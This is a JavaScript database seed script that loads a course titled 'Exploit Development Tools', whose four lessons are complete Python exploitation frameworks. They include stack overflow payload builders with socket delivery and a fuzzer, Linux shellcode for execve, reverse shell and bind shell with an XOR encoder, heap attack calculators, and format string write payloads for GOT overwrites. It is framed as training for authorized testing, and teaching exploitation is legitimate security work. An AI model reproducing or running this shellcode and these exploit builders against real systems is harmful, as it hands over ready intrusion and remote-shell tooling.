import Database from 'better-sqlite3';

const sqlite = new Database('data/quest-log.db');

const insertPath = sqlite.prepare(
  'INSERT INTO paths (name, description, color, created_at) VALUES (?, ?, ?, ?)'
);
const insertModule = sqlite.prepare(
  'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = sqlite.prepare(
  'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);

const now = Date.now();

// Create the learning path
const pathResult = insertPath.run(
  'Exploit Development Tools',
  'Build buffer overflow frameworks, shellcode generators, and exploit development utilities from scratch',
  '#dc2626',
  now
);
const pathId = pathResult.lastInsertRowid;

// Module 1: Buffer Overflow Framework
const module1Result = insertModule.run(
  pathId,
  'Buffer Overflow Framework',
  'Build a complete buffer overflow exploitation framework',
  0,
  now
);
const module1Id = module1Result.lastInsertRowid;

insertTask.run(
  module1Id,
  'Stack Buffer Overflow Exploiter',
  'Build a framework for exploiting stack-based buffer overflows',
  `# Stack Buffer Overflow Exploitation Framework

Build a complete framework for discovering and exploiting stack-based buffer overflows.

## Python Implementation

\`\`\`python
#!/usr/bin/env python3
"""
Stack Buffer Overflow Exploitation Framework
Educational implementation for authorized security testing
"""

import struct
import socket
import sys
import subprocess
from typing import Optional, Callable
from dataclasses import dataclass, field


@dataclass
class Architecture:
    """Target architecture configuration"""
    name: str
    bits: int
    endian: str  # 'little' or 'big'
    nop: bytes
    registers: list

    def pack(self, value: int) -> bytes:
        """Pack address for architecture"""
        if self.bits == 32:
            fmt = '<I' if self.endian == 'little' else '>I'
        else:
            fmt = '<Q' if self.endian == 'little' else '>Q'
        return struct.pack(fmt, value)

    def unpack(self, data: bytes) -> int:
        """Unpack address from bytes"""
        if self.bits == 32:
            fmt = '<I' if self.endian == 'little' else '>I'
        else:
            fmt = '<Q' if self.endian == 'little' else '>Q'
        return struct.unpack(fmt, data)[0]


# Common architectures
X86 = Architecture(
    name="x86",
    bits=32,
    endian="little",
    nop=b"\\x90",
    registers=['eax', 'ebx', 'ecx', 'edx', 'esp', 'ebp', 'esi', 'edi', 'eip']
)

X64 = Architecture(
    name="x86_64",
    bits=64,
    endian="little",
    nop=b"\\x90",
    registers=['rax', 'rbx', 'rcx', 'rdx', 'rsp', 'rbp', 'rsi', 'rdi', 'rip', 'r8-r15']
)


@dataclass
class BadChars:
    """Bad character management"""
    chars: bytes = field(default_factory=lambda: b"\\x00")

    def add(self, char: bytes):
        self.chars += char

    def contains(self, data: bytes) -> bool:
        return any(b in data for b in self.chars)

    def filter_payload(self, payload: bytes) -> bytes:
        return bytes(b for b in payload if b not in self.chars)

    def generate_test_string(self) -> bytes:
        return bytes(range(256))


class PatternGenerator:
    """Cyclic pattern generator for offset finding"""

    def __init__(self):
        self.upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        self.lower = "abcdefghijklmnopqrstuvwxyz"
        self.numbers = "0123456789"

    def create(self, length: int) -> bytes:
        """Create unique cyclic pattern"""
        pattern = []
        for u in self.upper:
            for l in self.lower:
                for n in self.numbers:
                    if len(pattern) >= length:
                        return bytes(pattern[:length])
                    pattern.extend([ord(u), ord(l), ord(n)])
        return bytes(pattern[:length])

    def find_offset(self, pattern: bytes, value: int, arch: Architecture) -> int:
        """Find offset of value in pattern"""
        if arch.bits == 32:
            search = struct.pack('<I', value)
        else:
            search = struct.pack('<Q', value)
        offset = pattern.find(search)
        if offset == -1:
            offset = pattern.find(search[::-1])
        return offset


class ShellcodeEncoder:
    """Basic shellcode encoder to avoid bad characters"""

    @staticmethod
    def xor_encode(shellcode: bytes, key: int, bad_chars: BadChars) -> tuple:
        """XOR encode shellcode with single-byte key"""
        for k in range(1, 256):
            if k in bad_chars.chars:
                continue
            encoded = bytes(b ^ k for b in shellcode)
            if not bad_chars.contains(encoded):
                return encoded, k
        return None, None

    @staticmethod
    def generate_decoder_stub(key: int, arch: Architecture) -> bytes:
        """Generate XOR decoder stub"""
        if arch.bits == 32:
            decoder = (
                b"\\xeb\\x0d"
                b"\\x5e"
                b"\\x31\\xc9"
                b"\\xb1\\xff"
                b"\\x80\\x36" + bytes([key]) +
                b"\\x46"
                b"\\xe2\\xfa"
                b"\\xeb\\x05"
                b"\\xe8\\xee\\xff\\xff\\xff"
            )
            return decoder
        else:
            decoder = (
                b"\\xeb\\x0f"
                b"\\x5e"
                b"\\x48\\x31\\xc9"
                b"\\xb1\\xff"
                b"\\x80\\x36" + bytes([key]) +
                b"\\x48\\xff\\xc6"
                b"\\xe2\\xf8"
                b"\\xeb\\x05"
                b"\\xe8\\xec\\xff\\xff\\xff"
            )
            return decoder


class ROPGadgetFinder:
    """ROP gadget finder for bypass techniques"""

    def __init__(self, binary_path: str):
        self.binary_path = binary_path
        self.gadgets = []

    def find_gadgets(self) -> list:
        """Find ROP gadgets in binary"""
        gadgets = []
        with open(self.binary_path, 'rb') as f:
            data = f.read()

        patterns = {
            'ret': b'\\xc3',
            'pop_ret': [
                (b'\\x58\\xc3', 'pop eax; ret'),
                (b'\\x5b\\xc3', 'pop ebx; ret'),
                (b'\\x59\\xc3', 'pop ecx; ret'),
                (b'\\x5a\\xc3', 'pop edx; ret'),
                (b'\\x5e\\xc3', 'pop esi; ret'),
                (b'\\x5f\\xc3', 'pop edi; ret'),
                (b'\\x5d\\xc3', 'pop ebp; ret'),
            ],
            'jmp_esp': b'\\xff\\xe4',
            'call_esp': b'\\xff\\xd4',
        }

        for name, pattern_list in patterns.items():
            if isinstance(pattern_list, bytes):
                pattern_list = [(pattern_list, name)]
            for pattern, desc in pattern_list:
                offset = 0
                while True:
                    pos = data.find(pattern, offset)
                    if pos == -1:
                        break
                    gadgets.append({
                        'offset': pos,
                        'bytes': pattern,
                        'description': desc
                    })
                    offset = pos + 1

        self.gadgets = gadgets
        return gadgets


class ExploitBuilder:
    """Build complete exploit payloads"""

    def __init__(self, arch: Architecture):
        self.arch = arch
        self.bad_chars = BadChars()
        self.pattern_gen = PatternGenerator()
        self.encoder = ShellcodeEncoder()

    def build_basic_overflow(
        self,
        offset: int,
        return_addr: int,
        shellcode: bytes,
        nop_sled: int = 16
    ) -> bytes:
        """Build basic stack overflow payload"""
        payload = b"A" * offset
        payload += self.arch.pack(return_addr)
        payload += self.arch.nop * nop_sled
        payload += shellcode
        return payload

    def build_seh_overflow(
        self,
        offset: int,
        nseh: int,
        seh: int,
        shellcode: bytes
    ) -> bytes:
        """Build SEH-based overflow payload"""
        jmp_short = b"\\xeb\\x06\\x90\\x90"
        payload = b"A" * offset
        payload += jmp_short
        payload += self.arch.pack(seh)
        payload += self.arch.nop * 16
        payload += shellcode
        return payload

    def build_rop_chain(
        self,
        gadgets: list,
        params: dict
    ) -> bytes:
        """Build ROP chain from gadgets"""
        chain = b""
        for gadget in gadgets:
            if isinstance(gadget, int):
                chain += self.arch.pack(gadget)
            elif isinstance(gadget, str) and gadget in params:
                chain += self.arch.pack(params[gadget])
            elif isinstance(gadget, bytes):
                chain += gadget
        return chain


class NetworkExploit:
    """Network-based exploit delivery"""

    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.socket = None

    def connect(self) -> bool:
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.target, self.port))
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False

    def send_payload(self, payload: bytes) -> Optional[bytes]:
        try:
            self.socket.send(payload)
            return self.socket.recv(4096)
        except Exception as e:
            print(f"[-] Send failed: {e}")
            return None

    def close(self):
        if self.socket:
            self.socket.close()


class FuzzerEngine:
    """Basic fuzzer for vulnerability discovery"""

    def __init__(self, send_func: Callable):
        self.send_func = send_func
        self.crashes = []

    def fuzz_length(
        self,
        prefix: bytes,
        suffix: bytes,
        start: int = 100,
        end: int = 10000,
        step: int = 100
    ) -> Optional[int]:
        """Fuzz with increasing buffer lengths"""
        for length in range(start, end, step):
            buffer = prefix + b"A" * length + suffix
            print(f"[*] Testing length: {length}")
            try:
                result = self.send_func(buffer)
                if result is None:
                    print(f"[+] Potential crash at length: {length}")
                    self.crashes.append(length)
                    return length
            except Exception as e:
                print(f"[+] Exception at length {length}: {e}")
                self.crashes.append(length)
                return length
        return None


def main():
    print("=== Buffer Overflow Exploitation Framework ===")
    print("Educational tool for authorized security testing only\\n")

    builder = ExploitBuilder(X86)
    pattern_gen = PatternGenerator()

    pattern = pattern_gen.create(5000)
    print(f"[*] Generated pattern of length {len(pattern)}")

    eip_value = 0x41326341
    offset = pattern_gen.find_offset(pattern, eip_value, X86)
    print(f"[+] Found offset at: {offset}")

    shellcode = (
        b"\\x31\\xc0\\x50\\x68\\x63\\x61\\x6c\\x63"
        b"\\x54\\x59\\xb8\\xc7\\x93\\xc2\\x77"
        b"\\xff\\xd0"
    )

    payload = builder.build_basic_overflow(
        offset=offset,
        return_addr=0x7C9D30D7,
        shellcode=shellcode,
        nop_sled=32
    )

    print(f"[+] Built payload of {len(payload)} bytes")


if __name__ == "__main__":
    main()
\`\`\`

## Key Concepts

1. **Cyclic Pattern Generation** - Create unique patterns to find exact crash offsets
2. **Bad Character Handling** - Identify and encode around restricted bytes
3. **ROP Gadget Finding** - Locate code reuse gadgets for DEP bypass
4. **SEH Exploitation** - Structured Exception Handler overwrites
5. **Payload Encoding** - XOR encoding to avoid bad characters`,
  0,
  now
);

insertTask.run(
  module1Id,
  'Shellcode Generator',
  'Build a cross-platform shellcode generation framework',
  `# Shellcode Generation Framework

Build a framework for generating and encoding shellcode payloads.

## Python Implementation

\`\`\`python
#!/usr/bin/env python3
"""
Shellcode Generation Framework
Educational implementation for authorized security testing
"""

import struct
import os
import sys
from typing import Optional, Dict, List
from dataclasses import dataclass
from enum import Enum


class Platform(Enum):
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"


class Arch(Enum):
    X86 = "x86"
    X64 = "x64"
    ARM = "arm"
    ARM64 = "arm64"


@dataclass
class ShellcodeTemplate:
    """Shellcode template with placeholders"""
    name: str
    platform: Platform
    arch: Arch
    code: bytes
    placeholders: Dict[str, int]
    description: str


class LinuxX86Shellcode:
    """Linux x86 shellcode generator"""

    @staticmethod
    def execve_binsh() -> bytes:
        """Execute /bin/sh"""
        shellcode = (
            b"\\x31\\xc0"
            b"\\x50"
            b"\\x68\\x2f\\x2f\\x73\\x68"
            b"\\x68\\x2f\\x62\\x69\\x6e"
            b"\\x89\\xe3"
            b"\\x50"
            b"\\x53"
            b"\\x89\\xe1"
            b"\\x31\\xd2"
            b"\\xb0\\x0b"
            b"\\xcd\\x80"
        )
        return shellcode

    @staticmethod
    def reverse_shell(ip: str, port: int) -> bytes:
        """Reverse shell to specified IP and port"""
        ip_parts = [int(x) for x in ip.split('.')]
        ip_bytes = bytes(ip_parts)
        port_bytes = struct.pack('>H', port)

        shellcode = (
            b"\\x31\\xc0"
            b"\\x31\\xdb"
            b"\\x31\\xc9"
            b"\\x31\\xd2"
            b"\\xb0\\x66"
            b"\\xb3\\x01"
            b"\\x51"
            b"\\x6a\\x01"
            b"\\x6a\\x02"
            b"\\x89\\xe1"
            b"\\xcd\\x80"
            b"\\x89\\xc6"
            b"\\xb0\\x66"
            b"\\xb3\\x03"
            b"\\x68" + ip_bytes +
            b"\\x66\\x68" + port_bytes +
            b"\\x66\\x6a\\x02"
            b"\\x89\\xe1"
            b"\\x6a\\x10"
            b"\\x51"
            b"\\x56"
            b"\\x89\\xe1"
            b"\\xcd\\x80"
            b"\\x31\\xc9"
            b"\\xb1\\x03"
            b"\\xfe\\xc9"
            b"\\xb0\\x3f"
            b"\\x89\\xf3"
            b"\\xcd\\x80"
            b"\\x75\\xf8"
            b"\\x31\\xc0"
            b"\\x50"
            b"\\x68\\x2f\\x2f\\x73\\x68"
            b"\\x68\\x2f\\x62\\x69\\x6e"
            b"\\x89\\xe3"
            b"\\x50"
            b"\\x53"
            b"\\x89\\xe1"
            b"\\x31\\xd2"
            b"\\xb0\\x0b"
            b"\\xcd\\x80"
        )
        return shellcode

    @staticmethod
    def bind_shell(port: int) -> bytes:
        """Bind shell on specified port"""
        port_bytes = struct.pack('>H', port)

        shellcode = (
            b"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2"
            b"\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x01\\x6a\\x02"
            b"\\x89\\xe1\\xcd\\x80\\x89\\xc6"
            b"\\xb0\\x66\\xb3\\x02"
            b"\\x31\\xc9\\x51\\x51"
            b"\\x66\\x68" + port_bytes +
            b"\\x66\\x6a\\x02"
            b"\\x89\\xe1\\x6a\\x10\\x51\\x56"
            b"\\x89\\xe1\\xcd\\x80"
            b"\\xb0\\x66\\xb3\\x04\\x6a\\x01\\x56"
            b"\\x89\\xe1\\xcd\\x80"
            b"\\xb0\\x66\\xb3\\x05\\x31\\xc9\\x51\\x51\\x56"
            b"\\x89\\xe1\\xcd\\x80\\x89\\xc3"
            b"\\x31\\xc9\\xb1\\x03\\xfe\\xc9\\xb0\\x3f"
            b"\\xcd\\x80\\x75\\xf8"
            b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
            b"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"
            b"\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80"
        )
        return shellcode


class LinuxX64Shellcode:
    """Linux x86_64 shellcode generator"""

    @staticmethod
    def execve_binsh() -> bytes:
        """Execute /bin/sh - null-free"""
        shellcode = (
            b"\\x48\\x31\\xf6"
            b"\\x56"
            b"\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68"
            b"\\x57"
            b"\\x48\\x89\\xe7"
            b"\\x48\\x31\\xd2"
            b"\\xb0\\x3b"
            b"\\x0f\\x05"
        )
        return shellcode


class ShellcodeEncoder:
    """Shellcode encoding techniques"""

    @staticmethod
    def xor_encode(shellcode: bytes, key: int) -> tuple:
        """Single-byte XOR encoding"""
        encoded = bytes(b ^ key for b in shellcode)
        decoder = (
            b"\\xeb\\x0d"
            b"\\x5e"
            b"\\x31\\xc9"
            b"\\xb1" + bytes([len(shellcode)]) +
            b"\\x80\\x36" + bytes([key]) +
            b"\\x46"
            b"\\xe2\\xfa"
            b"\\xeb\\x05"
            b"\\xe8\\xee\\xff\\xff\\xff"
        )
        return decoder + encoded, key

    @staticmethod
    def alphanumeric_encode(shellcode: bytes) -> bytes:
        """Encode as alphanumeric characters only"""
        alpha = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        encoded = []
        for byte in shellcode:
            high = byte >> 4
            low = byte & 0x0f
            encoded.append(alpha[high % len(alpha)])
            encoded.append(alpha[low % len(alpha)])
        return bytes(encoded)


class ShellcodeFactory:
    """Factory for generating shellcode"""

    def __init__(self, platform: Platform, arch: Arch):
        self.platform = platform
        self.arch = arch

    def generate(self, payload_type: str, **kwargs) -> bytes:
        """Generate shellcode based on parameters"""
        if self.platform == Platform.LINUX:
            if self.arch == Arch.X86:
                gen = LinuxX86Shellcode
            else:
                gen = LinuxX64Shellcode
        else:
            raise ValueError("Platform not supported")

        if payload_type == "exec":
            return gen.execve_binsh()
        elif payload_type == "reverse":
            return gen.reverse_shell(kwargs['ip'], kwargs['port'])
        elif payload_type == "bind":
            return gen.bind_shell(kwargs['port'])
        else:
            raise ValueError(f"Unknown payload type: {payload_type}")

    def format_output(self, shellcode: bytes, fmt: str) -> str:
        """Format shellcode for different uses"""
        if fmt == "python":
            return 'shellcode = b"' + ''.join(f'\\\\x{b:02x}' for b in shellcode) + '"'
        elif fmt == "c":
            lines = []
            for i in range(0, len(shellcode), 16):
                chunk = shellcode[i:i+16]
                line = '"' + ''.join(f'\\\\x{b:02x}' for b in chunk) + '"'
                lines.append(line)
            return "unsigned char shellcode[] = \\n" + "\\n".join(lines) + ";"
        elif fmt == "hex":
            return shellcode.hex()
        else:
            return str(shellcode)


def main():
    print("=== Shellcode Generation Framework ===\\n")

    factory = ShellcodeFactory(Platform.LINUX, Arch.X86)

    sc = factory.generate("exec")
    print("[+] Linux x86 execve /bin/sh:")
    print(factory.format_output(sc, "python"))
    print(f"    Length: {len(sc)} bytes\\n")

    sc = factory.generate("reverse", ip="192.168.1.100", port=4444)
    print("[+] Linux x86 reverse shell:")
    print(factory.format_output(sc, "c"))
    print(f"    Length: {len(sc)} bytes\\n")

    encoder = ShellcodeEncoder()
    encoded, key = encoder.xor_encode(sc, 0x41)
    print(f"[+] XOR encoded (key=0x{key:02x}):")
    print(f"    Length: {len(encoded)} bytes")


if __name__ == "__main__":
    main()
\`\`\`

## Shellcode Development Principles

1. **Position Independent Code** - No hardcoded addresses
2. **Null-Free Shellcode** - Avoid \\x00 for string-based exploits
3. **Small Footprint** - Minimize size for constrained buffers
4. **Staged vs Stageless** - Trade size for functionality`,
  1,
  now
);

// Module 2: Heap Exploitation
const module2Result = insertModule.run(
  pathId,
  'Heap Exploitation',
  'Understand and exploit heap-based vulnerabilities',
  1,
  now
);
const module2Id = module2Result.lastInsertRowid;

insertTask.run(
  module2Id,
  'Heap Analysis Framework',
  'Build tools for analyzing heap memory and finding vulnerabilities',
  `# Heap Analysis and Exploitation Framework

Build tools for heap memory analysis and exploitation.

## Python Implementation

\`\`\`python
#!/usr/bin/env python3
"""
Heap Analysis and Exploitation Framework
Educational implementation for understanding heap internals
"""

import struct
from dataclasses import dataclass, field
from typing import Optional, List, Dict
from enum import Enum


class ChunkState(Enum):
    ALLOCATED = "allocated"
    FREE = "free"
    TOP = "top"


@dataclass
class MallocChunk:
    """Representation of a malloc chunk (glibc)"""
    address: int
    prev_size: int
    size: int
    flags: int
    fd: Optional[int] = None
    bk: Optional[int] = None
    user_data: bytes = field(default_factory=bytes)

    @property
    def is_prev_inuse(self) -> bool:
        return bool(self.flags & 0x1)

    @property
    def real_size(self) -> int:
        return self.size & ~0x7

    @property
    def state(self) -> ChunkState:
        if self.fd is not None:
            return ChunkState.FREE
        return ChunkState.ALLOCATED


class HeapAnalyzer:
    """Analyze heap memory layout"""

    def __init__(self, arch_bits: int = 64):
        self.bits = arch_bits
        self.chunks: List[MallocChunk] = []

        if arch_bits == 64:
            self.size_sz = 8
            self.malloc_alignment = 16
            self.min_chunk_size = 32
            self.max_fast = 0x80
        else:
            self.size_sz = 4
            self.malloc_alignment = 8
            self.min_chunk_size = 16
            self.max_fast = 0x40

    def parse_chunk(self, data: bytes, address: int) -> MallocChunk:
        """Parse chunk from memory dump"""
        if self.bits == 64:
            fmt = '<QQ'
            header_size = 16
        else:
            fmt = '<II'
            header_size = 8

        prev_size, size_with_flags = struct.unpack(fmt, data[:header_size])
        size = size_with_flags & ~0x7
        flags = size_with_flags & 0x7

        chunk = MallocChunk(
            address=address,
            prev_size=prev_size,
            size=size,
            flags=flags,
            user_data=data[header_size:header_size + size - header_size]
        )
        return chunk

    def request2size(self, req: int) -> int:
        """Convert request size to chunk size"""
        if req + self.size_sz + self.malloc_alignment - 1 < self.min_chunk_size:
            return self.min_chunk_size
        return (req + self.size_sz + self.malloc_alignment - 1) & ~(self.malloc_alignment - 1)

    def size2bin(self, size: int) -> str:
        """Determine which bin a size belongs to"""
        if size <= self.max_fast:
            return f"fastbin[{(size >> 4) - 2}]"
        elif size < 0x400:
            return f"smallbin[{(size >> 4) - 2}]"
        else:
            return "largebin"


class HeapExploitBuilder:
    """Build heap exploitation primitives"""

    def __init__(self, arch_bits: int = 64):
        self.bits = arch_bits
        self.ptr_size = arch_bits // 8

    def build_fake_chunk(
        self,
        size: int,
        fd: int = 0,
        bk: int = 0,
        prev_inuse: bool = True
    ) -> bytes:
        """Build a fake malloc chunk"""
        flags = 1 if prev_inuse else 0
        size_field = size | flags

        if self.bits == 64:
            chunk = struct.pack('<QQ', 0, size_field)
            chunk += struct.pack('<QQ', fd, bk)
        else:
            chunk = struct.pack('<II', 0, size_field)
            chunk += struct.pack('<II', fd, bk)
        return chunk

    def build_house_of_force(
        self,
        target_addr: int,
        current_top: int,
        current_top_size: int
    ) -> dict:
        """Calculate values for House of Force attack"""
        if self.bits == 64:
            evil_size = 0xffffffffffffffff
        else:
            evil_size = 0xffffffff

        header_size = self.ptr_size * 2
        request_size = target_addr - current_top - header_size

        return {
            'evil_size': evil_size,
            'malloc_size': request_size,
            'description': f"""
House of Force Attack:
1. Overflow into top chunk, set size to {hex(evil_size)}
2. malloc({hex(request_size)}) to position top at target
3. Next malloc returns target address
"""
        }

    def build_tcache_poison(
        self,
        target_addr: int,
        chunk_size: int
    ) -> dict:
        """Calculate values for tcache poisoning"""
        return {
            'chunk_size': chunk_size,
            'target': target_addr,
            'description': f"""
Tcache Poisoning:
1. Allocate and free chunk to populate tcache
2. Use UAF/overflow to overwrite tcache fd pointer
3. Set fd to target: {hex(target_addr)}
4. Allocate twice - second returns target address
5. Write arbitrary data to target
"""
        }


def main():
    print("=== Heap Analysis Framework ===\\n")

    analyzer = HeapAnalyzer(64)

    chunk_data = b"\\x00" * 8
    chunk_data += struct.pack('<Q', 0x91)
    chunk_data += b"A" * 0x80

    chunk = analyzer.parse_chunk(chunk_data, 0x555555559000)
    print(f"[+] Parsed chunk at 0x{chunk.address:x}")
    print(f"    Size: 0x{chunk.real_size:x}")
    print(f"    PREV_INUSE: {chunk.is_prev_inuse}")

    builder = HeapExploitBuilder(64)

    print("\\n[*] House of Force calculation:")
    hof = builder.build_house_of_force(
        target_addr=0x601000,
        current_top=0x603000,
        current_top_size=0x20000
    )
    print(hof['description'])

    print("[*] Tcache Poison calculation:")
    tcp = builder.build_tcache_poison(
        target_addr=0x601028,
        chunk_size=0x20
    )
    print(tcp['description'])


if __name__ == "__main__":
    main()
\`\`\`

## Heap Exploitation Techniques

1. **House of Force** - Overwrite top chunk size for arbitrary allocation
2. **Fastbin Dup** - Double-free in fastbins for arbitrary allocation
3. **Tcache Poison** - Corrupt tcache fd pointer for arbitrary write
4. **Unsafe Unlink** - Exploit unlink macro for arbitrary write`,
  0,
  now
);

insertTask.run(
  module2Id,
  'Format String Exploit Framework',
  'Build tools for exploiting format string vulnerabilities',
  `# Format String Exploitation Framework

Build a framework for discovering and exploiting format string vulnerabilities.

## Python Implementation

\`\`\`python
#!/usr/bin/env python3
"""
Format String Exploitation Framework
Educational implementation for authorized security testing
"""

import struct
from typing import Optional, List, Tuple
from dataclasses import dataclass


@dataclass
class FormatStringConfig:
    """Configuration for format string exploitation"""
    arch_bits: int = 64
    offset: int = 0
    max_writes: int = 4
    endian: str = 'little'

    @property
    def ptr_size(self) -> int:
        return self.arch_bits // 8

    def pack_addr(self, addr: int) -> bytes:
        if self.arch_bits == 64:
            fmt = '<Q' if self.endian == 'little' else '>Q'
        else:
            fmt = '<I' if self.endian == 'little' else '>I'
        return struct.pack(fmt, addr)


class FormatStringAnalyzer:
    """Analyze format string vulnerabilities"""

    def __init__(self, config: FormatStringConfig):
        self.config = config

    def generate_offset_finder(self, marker: str = "AAAA") -> str:
        """Generate payload to find input offset on stack"""
        payload = marker
        for i in range(1, 50):
            payload += f".%{i}$p"
        return payload

    def find_offset(self, output: str, marker: str = "AAAA") -> Optional[int]:
        """Find offset from format string output"""
        marker_hex = marker.encode().hex()
        parts = output.split('.')
        for i, part in enumerate(parts):
            clean = part.strip().replace('0x', '').replace('(nil)', '0')
            if marker_hex in clean or clean == '41414141':
                return i
        return None


class FormatStringPayloadBuilder:
    """Build format string exploitation payloads"""

    def __init__(self, config: FormatStringConfig):
        self.config = config

    def build_arbitrary_read(
        self,
        target_addr: int,
        read_type: str = 's'
    ) -> bytes:
        """Build payload to read from arbitrary address"""
        offset = self.config.offset
        payload = self.config.pack_addr(target_addr)
        payload += f"%{offset}\${read_type}".encode()
        return payload

    def build_arbitrary_write(
        self,
        target_addr: int,
        value: int,
        technique: str = 'hn'
    ) -> bytes:
        """Build payload to write to arbitrary address"""
        if technique == 'hn':
            return self._build_write_hn(target_addr, value)
        elif technique == 'hhn':
            return self._build_write_hhn(target_addr, value)
        return b""

    def _build_write_hn(
        self,
        target_addr: int,
        value: int
    ) -> bytes:
        """Write using %hn (2 bytes at a time)"""
        offset = self.config.offset

        if self.config.arch_bits == 64:
            writes = []
            for i in range(4):
                addr = target_addr + (i * 2)
                val = (value >> (i * 16)) & 0xffff
                writes.append((addr, val))
        else:
            writes = [
                (target_addr, value & 0xffff),
                (target_addr + 2, (value >> 16) & 0xffff)
            ]

        return self._build_multi_write(writes, 'hn', offset)

    def _build_write_hhn(
        self,
        target_addr: int,
        value: int
    ) -> bytes:
        """Write using %hhn (1 byte at a time)"""
        offset = self.config.offset
        byte_count = self.config.ptr_size

        writes = []
        for i in range(byte_count):
            addr = target_addr + i
            val = (value >> (i * 8)) & 0xff
            writes.append((addr, val))

        return self._build_multi_write(writes, 'hhn', offset)

    def _build_multi_write(
        self,
        writes: List[Tuple[int, int]],
        specifier: str,
        base_offset: int
    ) -> bytes:
        """Build payload for multiple writes"""
        writes = sorted(writes, key=lambda x: x[1])

        addresses = b""
        for addr, _ in writes:
            addresses += self.config.pack_addr(addr)

        format_str = ""
        written = 0

        for i, (_, val) in enumerate(writes):
            target = val
            if target < written:
                if specifier == 'hhn':
                    target += 0x100
                else:
                    target += 0x10000

            padding = target - written
            if padding > 0:
                format_str += f"%{padding}c"
            format_str += f"%{base_offset + i}\${specifier}"
            written = target

        return addresses + format_str.encode()


def main():
    print("=== Format String Exploitation Framework ===\\n")

    config = FormatStringConfig(arch_bits=64, offset=6)
    builder = FormatStringPayloadBuilder(config)
    analyzer = FormatStringAnalyzer(config)

    print("[*] Offset finder payload:")
    print(f"    {analyzer.generate_offset_finder()[:80]}...\\n")

    print("[*] Arbitrary read payload (0x601020):")
    payload = builder.build_arbitrary_read(0x601020, 's')
    print(f"    {payload.hex()}\\n")

    print("[*] GOT overwrite (printf -> system):")
    payload = builder.build_arbitrary_write(
        target_addr=0x601020,
        value=0x7ffff7a52390,
        technique='hn'
    )
    print(f"    Length: {len(payload)} bytes")


if __name__ == "__main__":
    main()
\`\`\`

## Format String Techniques

1. **%p / %x Leaks** - Read stack values
2. **%s Read** - Read strings from arbitrary addresses
3. **%n Write** - Write count of printed characters
4. **%hn / %hhn** - Write 2 bytes / 1 byte at a time
5. **GOT Overwrite** - Redirect function calls`,
  1,
  now
);

console.log('Seeded: Exploit Development Tools');
console.log('  - 2 modules, 4 tasks');

sqlite.close();
